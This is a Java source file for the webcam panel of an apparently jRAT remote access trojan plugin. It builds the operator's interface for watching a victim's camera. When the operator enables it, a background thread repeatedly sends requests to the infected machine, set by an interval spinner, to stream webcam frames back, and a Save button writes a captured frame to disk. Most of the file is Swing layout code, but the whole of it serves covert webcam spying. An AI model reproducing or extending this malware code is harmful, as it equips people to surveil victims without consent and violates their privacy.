package pro.jrat.plugin.client;

import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.File;

import javax.imageio.ImageIO;
import javax.swing.ButtonGroup;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JScrollPane;
import javax.swing.JSeparator;
import javax.swing.JSpinner;
import javax.swing.JToggleButton;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.SpinnerNumberModel;
import javax.swing.SwingConstants;

import pro.jrat.api.BaseControlPanel;

@SuppressWarnings("serial")
public class PanelWebcam extends BaseControlPanel {
	
	public static int WIDTH = 320;
	public static int HEIGHT = 240;
	
	private final ButtonGroup buttonGroup = new ButtonGroup();
	
	public BufferedImage image;
	public ImageIcon icon;
	public JLabel lbl;
	public JScrollPane scrollPane;
	private JLabel lblName;
	private JToggleButton tglbtnEnable;
	private JToggleButton tglbtnDisable;
	private JSpinner spInterval;

	public void setDisabled() {
		
	}
	
	public void setNoWebcamFound() {
		tglbtnDisable.setSelected(true);
		tglbtnEnable.setSelected(false);
		setCamName("No webcam found");
		lblName.setForeground(Color.red);
	}
	
	public PanelWebcam() {
		image = new BufferedImage(WIDTH, HEIGHT, BufferedImage.TYPE_INT_RGB);
		icon = new ImageIcon(image);
		lbl = new JLabel(icon);
		scrollPane = new JScrollPane(lbl);
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
		
		tglbtnEnable = new JToggleButton("Enable");
		tglbtnEnable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				try {
					WebcamPlugin.enabled = true;						
					new Thread(new Runnable() {
						@Override
						public void run() {
							try {
								while (true) {
									getServer().addToSendQueue(new Packet(getServer()));
									
									if (!WebcamPlugin.enabled) {
										return;
									}
									
									Thread.sleep((long) (Integer) spInterval.getValue());
								}
							} catch (Exception e) {
								e.printStackTrace();
							}
						}			
					}).start();
				} catch (Exception e) {					
					e.printStackTrace();
				}
			}
		});
		buttonGroup.add(tglbtnEnable);
		
		tglbtnDisable = new JToggleButton("Disable");
		tglbtnDisable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				disableCapturing();			
			}
		});
		buttonGroup.add(tglbtnDisable);
		tglbtnDisable.setSelected(true);
		
		JButton btnSave = new JButton("Save");
		btnSave.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JFileChooser c = new JFileChooser();
				c.showSaveDialog(null);
				File file = c.getSelectedFile();
				
				if (file != null) {
					try {
						ImageIO.write(image, "png", file);
					} catch (Exception e) {				
						e.printStackTrace();
					}
				}
			}
		});
		
		JSeparator separator = new JSeparator();
		separator.setOrientation(SwingConstants.VERTICAL);
		
		JSeparator separator_1 = new JSeparator();
		separator_1.setOrientation(SwingConstants.VERTICAL);
		
		lblName = new JLabel("Unknown");
		
		spInterval = new JSpinner();
		spInterval.setModel(new SpinnerNumberModel(100, 0, 10000, 10));
		
		JLabel lblMs = new JLabel("ms");
		
		JSeparator separator_2 = new JSeparator();
		separator_2.setOrientation(SwingConstants.VERTICAL);
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addComponent(scrollPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 450, Short.MAX_VALUE)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addComponent(tglbtnEnable)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(tglbtnDisable)
					.addGap(8)
					.addComponent(separator, GroupLayout.PREFERRED_SIZE, 3, GroupLayout.PREFERRED_SIZE)
					.addGap(7)
					.addComponent(btnSave)
					.addGap(10)
					.addComponent(separator_1, GroupLayout.PREFERRED_SIZE, 3, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addComponent(spInterval, GroupLayout.PREFERRED_SIZE, 60, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(lblMs)
					.addGap(7)
					.addComponent(separator_2, GroupLayout.PREFERRED_SIZE, 3, GroupLayout.PREFERRED_SIZE)
					.addGap(8)
					.addComponent(lblName)
					.addContainerGap(65, Short.MAX_VALUE))
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
							.addComponent(tglbtnEnable)
							.addComponent(tglbtnDisable)
							.addComponent(btnSave))
						.addComponent(separator, GroupLayout.PREFERRED_SIZE, 22, GroupLayout.PREFERRED_SIZE)
						.addComponent(separator_1, GroupLayout.PREFERRED_SIZE, 22, GroupLayout.PREFERRED_SIZE)
						.addGroup(groupLayout.createParallelGroup(Alignment.TRAILING)
							.addComponent(separator_2, GroupLayout.PREFERRED_SIZE, 22, GroupLayout.PREFERRED_SIZE)
							.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
								.addComponent(spInterval, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
								.addComponent(lblMs)
								.addComponent(lblName))))
					.addGap(12))
		);
		setLayout(groupLayout);

	}
	
	@Override
	public void onClose() {
		disableCapturing();
	}
	
	public void disableCapturing() {
		try {
			WebcamPlugin.enabled = false;
			Thread.sleep((long) (Integer) spInterval.getValue());
			getServer().addToSendQueue(new Packet(getServer()));
		} catch (Exception e) {					
			e.printStackTrace();
		}	
	}

	public void setCamName(String name) {
		lblName.setText(name);
	}
}
